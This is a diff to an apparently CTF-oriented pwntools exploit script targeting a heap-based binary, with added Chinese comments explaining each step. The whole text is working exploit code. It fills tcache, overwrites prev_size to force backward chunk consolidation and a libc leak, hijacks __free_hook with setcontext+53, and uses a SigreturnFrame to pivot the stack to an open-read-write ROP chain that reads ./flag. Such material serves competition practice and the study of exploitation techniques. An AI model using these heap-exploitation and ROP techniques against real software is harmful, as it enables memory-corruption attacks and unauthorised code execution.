@@ -33,15 +33,14 @@ for i in range(7):
 add(7, 0x88)
 add(8, 0x88)
 add(9, 0x88)
-add(14,0x190)
-add(15,0x190)
+add(14,0x190)#打算放orw rop，使程序栈迁移到它
+add(15,0x190)#打算放SigreturnFrame，改变freehook为setcontext+53后free它就能更改寄存器的值
 add(10, 0x10)
+#填充tcache 0x90
 for i in range(8):
     free(i)
-
-overedit(8, b'1' * 0x80 + p64(0x120) , 0)
+overedit(8, b'1' * 0x80 + p64(0x120) , 0)#改变第9块的presize和preinuse，使其释放时把第8第7块一块合并了，这样只要第8块中出现libc地址就能用show函数得到
 free(9)
-# pause()
 add(11, 0x98)
 add(12, 0x78)
 
@@ -88,23 +87,24 @@ edit(2,p64(setcontext+53))
 
 frame = SigreturnFrame()
 frame.rsp=heap_addr+0x2d0
-frame.rdi = 0
-frame.rsi = heap_addr + 0x2d0
-frame.rdx = 0x200
+# frame.rdi = 0
+# frame.rsi = heap_addr + 0x2d0
+# frame.rdx = 0x200
 frame.rbp=heap_addr+0x2d0
 frame.rip = leave_ret
 # edit()
 byte_frame=bytes(frame)
 print(byte_frame ,len(byte_frame),type(byte_frame))
-gdb.attach(p,'b free')
+# gdb.attach(p,'b free')
 edit(1,b'./flag\x00')
 #下面两种方法得到orwrop链都可以
+orw_payload=p64(0xdeadbeef)
 if 1==0:
-    orw_payload=flat([0,pop_rdi,heap_addr+0x1c0,pop_rsi,0,open_addr])
+    orw_payload+=flat([pop_rdi,heap_addr+0x1c0,pop_rsi,0,open_addr])
     orw_payload+=flat([pop_rdi,3,pop_rsi,heap_addr+0x1f0,pop_rdx,0x30,read_addr])
     orw_payload+=flat([pop_rdi,1,pop_rsi,heap_addr+0x1f0,pop_rdx,0x30,write_addr])
 else:
-    orw_payload=flat([0,pop_rdi,heap_addr+0x1c0,pop_rsi,0,pop_rax,2,syscall])
+    orw_payload+=flat([pop_rdi,heap_addr+0x1c0,pop_rsi,0,pop_rax,2,syscall])
     orw_payload+=flat([pop_rdi,3,pop_rsi,heap_addr+0x1f0,pop_rdx,0x30,pop_rax,0,syscall])
     orw_payload+=flat([pop_rdi,1,pop_rsi,heap_addr+0x1f0,pop_rdx,0x20,pop_rax,1,syscall])
 edit(14,orw_payload)
